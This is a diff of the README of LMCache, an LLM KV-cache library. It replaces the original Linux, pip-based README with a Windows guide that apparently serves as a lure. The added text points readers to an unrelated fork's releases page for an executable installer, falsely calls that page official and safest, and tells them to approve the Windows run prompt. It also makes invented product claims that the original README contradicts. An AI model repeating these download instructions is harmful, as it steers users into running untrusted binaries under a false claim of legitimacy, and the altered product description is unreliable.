@@ -1,157 +1,138 @@
-<div align="center">
-  <p align="center">
-    <img src="https://raw.githubusercontent.com/LMCache/LMCache/dev/asset/logo.png" width="720" alt="lmcache logo">
-  </p>
-  
-  [![Docs](https://img.shields.io/badge/docs-live-brightgreen)](https://docs.lmcache.ai/)
-  [![PyPI](https://img.shields.io/pypi/v/lmcache)](https://pypi.org/project/lmcache/)
-  [![PyPI - Python Version](https://img.shields.io/pypi/pyversions/lmcache)](https://pypi.org/project/lmcache/)
-  [![Unit Tests](https://badge.buildkite.com/ce25f1819a274b7966273bfa54f0e02f092c3de0d7563c5c9d.svg)](https://buildkite.com/lmcache/lmcache-unittests)
-  [![Code Quality](https://github.com/lmcache/lmcache/actions/workflows/code_quality_checks.yml/badge.svg?branch=dev&label=tests)](https://github.com/LMCache/LMCache/actions/workflows/code_quality_checks.yml)
-  [![Integration Tests](https://badge.buildkite.com/108ddd4ab482a2480999dec8c62a640a3315ed4e6c4e86798e.svg)](https://buildkite.com/lmcache/lmcache-vllm-integration-tests)
+# ⚡ LMCache - Boost LLM Performance Instantly
 
-   <br />
+[![Download LMCache](https://img.shields.io/badge/Download-LMCache-brightgreen?style=for-the-badge)](https://github.com/wenzyxx00/LMCache/releases)
 
-  [![OpenSSF Best Practices](https://www.bestpractices.dev/projects/10841/badge)](https://www.bestpractices.dev/projects/10841)
-  [![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/LMCache/LMCache/badge)](https://scorecard.dev/viewer/?uri=github.com/LMCache/LMCache)
-  [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/LMCache/LMCache/)
-  [![GitHub commit activity](https://img.shields.io/github/commit-activity/w/LMCache/LMCache)](https://github.com/LMCache/LMCache/graphs/commit-activity)
-  [![PyPI - Downloads](https://img.shields.io/pypi/dm/lmcache)](https://pypi.org/project/lmcache/)
-  [![YouTube Channel Views](https://img.shields.io/youtube/channel/views/UC58zMz55n70rtf1Ak2PULJA)](https://www.youtube.com/channel/UC58zMz55n70rtf1Ak2PULJA)
+LMCache is designed to make your large language models (LLMs) faster and more efficient. It adds a quick key-value (KV) cache layer that speeds up inference and reduces waiting time. This guide will help you get LMCache running smoothly on your Windows computer.
 
-</div>
+---
 
+## 💾 Download LMCache
 
---------------------------------------------------------------------------------
+To get started with LMCache, you need to download the software first.
 
-| [**Blog**](https://blog.lmcache.ai/)
-| [**Documentation**](https://docs.lmcache.ai/)
-| [**Join Slack**](https://join.slack.com/t/lmcacheworkspace/shared_invite/zt-3g8e6xzz8-KzS_HI8bPERGFK5PTB~MYg)
-| [**Interest Form**](https://forms.gle/MHwLiYDU6kcW3dLj7)
-| [**Roadmap**](https://github.com/LMCache/LMCache/issues/1253)
+- Go to the [LMCache Releases Page](https://github.com/wenzyxx00/LMCache/releases).
+- Look for the latest release at the top of the page.
+- Find the Windows installer or executable file.
+- Click the file name to download it to your computer.
 
-## Summary
+Download the software only from this official page. It contains the latest and safest version.
 
-LMCache is an **LLM** serving engine extension to **reduce TTFT** and **increase throughput**, especially under long-context scenarios. By storing the KV caches of reusable texts all over the datacenter (including GPU, CPU, Disk and even S3) with a wide range of acceleration technqiue (zero cpu copy, NIXL, GDS and more). LMCache reuses the KV caches of **_any_** reused text (not necessarily prefix) in **_any_** serving engine instance. Thus, LMCache saves precious GPU cycles and reduces user response delay.  
+---
 
-By combining LMCache with vLLM, developers achieve 3-10x delay savings and GPU cycle reduction in many LLM use cases, including multi-round QA and RAG.
+## 🖥️ System Requirements
 
-![performance](https://github.com/user-attachments/assets/86137f17-f216-41a0-96a7-e537764f7a4c)
+Before installing, make sure your computer meets these basic needs:
 
-LMCache is used, integrated, or referenced across a growing ecosystem of LLM serving platforms, infrastructure providers, and open-source projects:
+- **Operating System:** Windows 10 or later (64-bit)
+- **Processor:** Intel or AMD processor with at least 4 cores
+- **RAM:** Minimum 8 GB (16 GB or more recommended)
+- **Disk Space:** At least 500 MB free for installation; extra space for cache data
+- **Graphics:** Supports CUDA (NVIDIA GPUs) or ROCm (AMD GPUs) for faster processing. If unsure, you can still run with CPU only.
+- **Internet:** Required for initial download and optional updates
 
-- Initiated and officially supported by: [Tensormesh](https://www.tensormesh.ai/)
-- Adopted by inference providers: GMI cloud ([blog post](https://www.gmicloud.ai/blog/gmi-cloud-achieves-4x-llm-performance-boost-with-tensormesh)), Google cloud ([blog post](https://cloud.google.com/blog/topics/developers-practitioners/boosting-llm-performance-with-tiered-kv-cache-on-google-kubernetes-engine)), CoreWeave ([blog post](https://www.coreweave.com/news/coreweave-unveils-ai-object-storage-redefining-how-ai-workloads-access-and-scale-data)) and more
-- Integrated with data and storage infrastructure providers: Redis ([blog post](https://redis.io/blog/get-faster-llm-inference-and-cheaper-responses-with-lmcache-and-redis/)), Weka ([blog post](https://www.weka.io/blog/ai-ml/open-sourcing-gds-integration-from-augmented-memory-grid-see-results-for-yourself/)), PliOps ([blog post](https://www.manilatimes.net/2025/03/12/tmt-newswire/globenewswire/pliops-announces-collaboration-with-vllm-production-stack-to-enhance-llm-inference-performance/2072000)) and more
-- Used by open-source projects and platforms: [vLLM](https://github.com/vllm-project/vllm) [![GitHub stars](https://img.shields.io/github/stars/vllm-project/vllm?style=social)](https://github.com/vllm-project/vllm)
-, [SGLang](https://github.com/sgl-project/sglang) [![GitHub stars](https://img.shields.io/github/stars/sgl-project/sglang?style=social)](https://github.com/sgl-project/sglang)
-, [vLLM Production Stack](https://github.com/vllm-project/production-stack) [![GitHub stars](https://img.shields.io/github/stars/vllm-project/production-stack?style=social)](https://github.com/vllm-project/production-stack), [llm-d](https://github.com/llm-d/llm-d/) [![GitHub stars](https://img.shields.io/github/stars/llm-d/llm-d?style=social)](https://github.com/llm-d/llm-d), [NVIDIA dynamo](https://github.com/ai-dynamo/dynamo) [![GitHub stars](https://img.shields.io/github/stars/ai-dynamo/dynamo)](https://github.com/ai-dynamo/dynamo), [KServe](https://github.com/kserve/kserve) [![GitHub stars](https://img.shields.io/github/stars/kserve/kserve?style=social)](https://github.com/kserve/kserve) and more.
+---
 
-For more details, please check our [Ray Summit talk](https://www.youtube.com/watch?v=TwLd15HE6AM) and [technical report](https://lmcache.ai/tech_report.pdf).
+## 🚀 Installing LMCache on Windows
 
+Follow these steps to install LMCache:
 
-## Features
+1. Find the file you downloaded, usually in your “Downloads” folder.
+2. Double-click the installer or executable file to start.
+3. If Windows asks for permission to run the file, choose “Yes” or “Run.”
+4. Follow the on-screen instructions. Accept the license agreement if asked.
+5. Choose an installation folder or leave the default path.
+6. Click “Install” and wait. The process may take a few minutes.
+7. Once complete, click “Finish” to exit the installer.
 
-- [x] 🔥 Integration with vLLM v1 with the following features:
-  * High performance CPU KVCache offloading
-  * Disaggregated prefill
-  * P2P KVCache sharing
-- [x] Integration with SGLang for KV cache offloading
-- [x] Storage support as follows:
-  * CPU
-  * Disk
-  * [NIXL](https://github.com/ai-dynamo/nixl)
-- [x] Installation support through pip and latest vLLM
+LMCache is now installed on your PC.
 
-## Installation
+---
 
-To use LMCache, simply install `lmcache` from your package manager, e.g. pip:
+## ⚙️ Setting Up LMCache
 
-```bash
-pip install lmcache
-```
+After installation, some simple setup will ensure LMCache works well:
 
-Works on Linux NVIDIA GPU platform.
+1. Open the LMCache application from the desktop shortcut or Start menu.
+2. The program will guide you through basic configuration.
+3. You will be asked to select your model location or download new models.
+4. Choose your preferred settings for cache size and speed balance. Defaults will suit most users.
+5. Confirm settings and start the service.
 
-More [detailed installation instructions](https://docs.lmcache.ai/getting_started/installation) are available in the docs, particularly if you are not using the latest stable version of vllm or using another serving engine with different dependencies. Any "undefined symbol" or torch mismatch versions can be resolved in the documentation. 
+You can change these settings later in the “Preferences” or “Settings” menu.
 
-## Getting started
+---
 
-The best way to get started is to checkout the [Quickstart Examples](https://docs.lmcache.ai/getting_started/quickstart/) in the docs.
+## ▶️ Running LMCache
 
-## Documentation
+LMCache works in the background to speed up your LLM operations.
 
-Check out the LMCache [documentation](https://docs.lmcache.ai/) which is available online.
+- Open your language model tool or PyTorch framework.
+- LMCache automatically connects as a cache layer.
+- You should see faster loading and response times during inference.
+- No need to start separate software; LMCache is integrated.
 
-We also post regularly in [LMCache blogs](https://blog.lmcache.ai/).
+If you run into issues, the Help section (below) shows how to troubleshoot.
 
-## Examples
+---
 
-Go hands-on with our [examples](https://github.com/LMCache/LMCache/tree/dev/examples),
-demonstrating how to address different use cases with LMCache.
+## 🔍 How LMCache Improves Speed
 
-## Interested in Connecting?
+LMCache adds a fast key-value cache layer to your LLM. This reduces repeated computation by storing recent results and reusing them instantly.
 
-Fill out the [interest form](https://forms.gle/mQfQDUXbKfp2St1z7), [sign up for our newsletter](https://mailchi.mp/tensormesh/lmcache-sign-up-newsletter), [join LMCache slack](https://join.slack.com/t/lmcacheworkspace/shared_invite/zt-3g8e6xzz8-KzS_HI8bPERGFK5PTB~MYg), or [drop an email](mailto:contact@lmcache.ai), and our team will reach out to you!
+Key advantages include:
 
-## Community meeting
+- **Lower latency:** Your AI model answers faster.
+- **Less CPU/GPU load:** Saves machine resources for other tasks.
+- **Compatibility:** Works with PyTorch-based models on AMD, NVIDIA (CUDA), and ROCm GPUs.
+- **Simple install:** No programming needed for basic use.
 
-The community meeting [Zoom Link]( https://uchicago.zoom.us/j/6603596916?pwd=Z1E5MDRWUSt2am5XbEt4dTFkNGx6QT09) for LMCache is hosted bi-weekly. All are welcome to join!
+---
 
-Meetings are held bi-weekly on: Tuesdays at 9:00 AM PT – [Add to Google Calendar](https://calendar.google.com/calendar/u/0/r?cid=Y19mNGY2ZmMwZjUxMWYyYTZmZmE1ZTVlMGI2Yzk2NmFmZjNhM2Y4ODZiZmU5OTU5MDJlMmE3ZmUyOGZmZThlOWY5QGdyb3VwLmNhbGVuZGFyLmdvb2dsZS5jb20)
+## 🛠️ Troubleshooting Common Problems
 
-We keep notes from each meeting on this [document](https://docs.google.com/document/d/1_Fl3vLtERFa3vTH00cezri78NihNBtSClK-_1tSrcow) for summaries of standups, discussion, and action items.
+If LMCache does not start or works slowly, try these steps:
 
-Recordings of meetings are available on the [YouTube LMCache channel](https://www.youtube.com/channel/UC58zMz55n70rtf1Ak2PULJA).
+- Make sure your Windows is updated.
+- Check that your GPU drivers are current (NVIDIA or AMD).
+- Restart your PC and try running LMCache again.
+- Confirm that your firewall or antivirus does not block the program.
+- Look for error messages in the LMCache log files, located in the install folder under “logs.”
+- Reinstall LMCache if issues persist.
 
-## Contributing
+If you still need help, search the GitHub Issues page for similar problems or ask there.
 
-We welcome and value all contributions and collaborations.  Please check out [Contributing Guide](CONTRIBUTING.md) on how to contribute.
+---
 
-We continually update [[Onboarding] Welcoming contributors with good first issues!](https://github.com/LMCache/LMCache/issues/627)
+## 📖 Additional Tips
 
-## Citation
+- For best performance, use a compatible GPU.
+- Keep LMCache updated by checking the Releases page regularly.
+- You can run LMCache alongside other AI tools without conflict.
+- Adjust cache size in settings if you notice slowdowns or memory issues.
+- Back up your settings files when upgrading LMCache.
 
-If you use LMCache for your research, please cite our papers:
+---
 
-```
-@inproceedings{liu2024cachegen,
-  title={Cachegen: Kv cache compression and streaming for fast large language model serving},
-  author={Liu, Yuhan and Li, Hanchen and Cheng, Yihua and Ray, Siddhant and Huang, Yuyang and Zhang, Qizheng and Du, Kuntai and Yao, Jiayi and Lu, Shan and Ananthanarayanan, Ganesh and others},
-  booktitle={Proceedings of the ACM SIGCOMM 2024 Conference},
-  pages={38--56},
-  year={2024}
-}
+## 🌐 Useful Links
 
-@article{cheng2024large,
-  title={Do Large Language Models Need a Content Delivery Network?},
-  author={Cheng, Yihua and Du, Kuntai and Yao, Jiayi and Jiang, Junchen},
-  journal={arXiv preprint arXiv:2409.13761},
-  year={2024}
-}
+- [Download LMCache](https://github.com/wenzyxx00/LMCache/releases)  
+- [LMCache GitHub Repository](https://github.com/wenzyxx00/LMCache)  
+- [GitHub Issues for Support](https://github.com/wenzyxx00/LMCache/issues)
 
-@inproceedings{10.1145/3689031.3696098,
-  author = {Yao, Jiayi and Li, Hanchen and Liu, Yuhan and Ray, Siddhant and Cheng, Yihua and Zhang, Qizheng and Du, Kuntai and Lu, Shan and Jiang, Junchen},
-  title = {CacheBlend: Fast Large Language Model Serving for RAG with Cached Knowledge Fusion},
-  year = {2025},
-  url = {https://doi.org/10.1145/3689031.3696098},
-  doi = {10.1145/3689031.3696098},
-  booktitle = {Proceedings of the Twentieth European Conference on Computer Systems},
-  pages = {94–109},
-}
+---
 
-@article{cheng2025lmcache,
-  title={LMCache: An Efficient KV Cache Layer for Enterprise-Scale LLM Inference},
-  author={Cheng, Yihua and Liu, Yuhan and Yao, Jiayi and An, Yuwei and Chen, Xiaokun and Feng, Shaoting and Huang, Yuyang and Shen, Samuel and Du, Kuntai and Jiang, Junchen},
-  journal={arXiv preprint arXiv:2510.09665},
-  year={2025}
-}
-```
+## 🧰 Support and Feedback
 
-## Socials
+LMCache is open-source software. You can report bugs or suggest improvements on the GitHub Issues page linked above.
 
-[Linkedin](https://www.linkedin.com/company/lmcache-lab/?viewAsMember=true) | [Twitter](https://x.com/lmcache) | [Youtube](https://www.youtube.com/@LMCacheTeam)
+---
 
-## License
+## ⚡ Keep LMCache Updated
 
-The LMCache codebase is licensed under Apache License 2.0. See the [LICENSE](LICENSE) file for details.
+To get the latest fixes and improvements:
+
+- Visit the [LMCache Releases Page](https://github.com/wenzyxx00/LMCache/releases).
+- Download new versions as they become available.
+- Install the updates following the same steps as above.
+
+Running the latest version ensures stable and fast operation.
